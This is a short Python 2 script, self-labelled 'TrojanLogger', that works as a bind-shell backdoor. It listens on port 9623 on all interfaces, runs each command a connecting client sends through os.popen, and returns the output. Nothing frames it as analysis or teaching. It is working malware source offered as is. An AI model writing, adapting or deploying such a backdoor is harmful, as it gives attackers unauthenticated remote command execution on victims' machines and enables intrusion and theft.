import socket
import threading
import os

bind_ip = "0.0.0.0"
bind_port = 9623

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_ip, bind_port))
server.listen(10)
print "[TrojanLogger] Listening on %s:%d"%(bind_ip, bind_port)

def handleTrojanClientRequest(tcpclient):
	request = tcpclient.recv(1024)

	print "[TrojanLogger] Shell command %s"%(request)
	command_fallback = os.popen(request, "r")

	for line in command_fallback:
		print line
		tcpclient.send(line)

while True:
	trojanclient, addr = server.accept()

	print "[TrojanLogger] Acepted connection from %s:%d"%(addr[0], addr[1])

	client_handler = threading.Thread(target=handleTrojanClientRequest, args=(trojanclient,))
	client_handler.start()
